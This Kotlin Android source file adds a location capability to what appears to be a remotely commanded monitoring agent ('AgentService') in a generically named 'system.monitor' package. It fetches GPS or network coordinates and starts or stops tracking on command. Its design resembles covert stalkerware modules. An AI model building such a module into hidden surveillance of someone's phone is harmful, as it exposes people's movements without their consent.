package com.system.monitor.capabilities

import android.Manifest
import android.content.Context
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.os.Build
import android.os.Bundle
import com.google.gson.Gson
import com.system.monitor.AgentService

class LocationCapability(private val service: AgentService) : AgentService.Capability {

    private var locationManager: LocationManager? = null
    private var lastLocation: Location? = null
    private val gson = Gson()
    private var listener: LocationListener? = null

    override fun execute(args: String?): Any {
        val params = gson.fromJson(args ?: "{}", Params::class.java)
        return when (params.action) {
            "get" -> getLocation()
            "start_tracking" -> { startTracking(); mapOf("status" to "tracking") }
            "stop_tracking" -> { stopTracking(); mapOf("status" to "stopped") }
            else -> mapOf("error" to "invalid action")
        }
    }

    private fun getLocation(): Map<String, Any> {
        locationManager = service.getSystemService(LocationManager::class.java)
        val provider = if (service.checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) == 0)
            LocationManager.GPS_PROVIDER else LocationManager.NETWORK_PROVIDER
        lastLocation = locationManager?.getLastKnownLocation(provider)
        return lastLocation?.let { loc ->
            mapOf("lat" to loc.latitude, "lon" to loc.longitude, "accuracy" to loc.accuracy, "time" to loc.time)
        } ?: mapOf("error" to "no location")
    }

    private fun startTracking() {
        locationManager = service.getSystemService(LocationManager::class.java)
        listener = object : LocationListener {
            override fun onLocationChanged(loc: Location) { lastLocation = loc }
            override fun onStatusChanged(provider: String, status: Int, extras: Bundle) {}
            override fun onProviderEnabled(provider: String) {}
            override fun onProviderDisabled(provider: String) {}
        }
        locationManager?.requestLocationUpdates(LocationManager.GPS_PROVIDER, 5000, 10f, listener!!)
    }

    private fun stopTracking() {
        listener?.let { locationManager?.removeUpdates(it) }
    }

    override fun cleanup() { stopTracking() }

    data class Params(val action: String)
}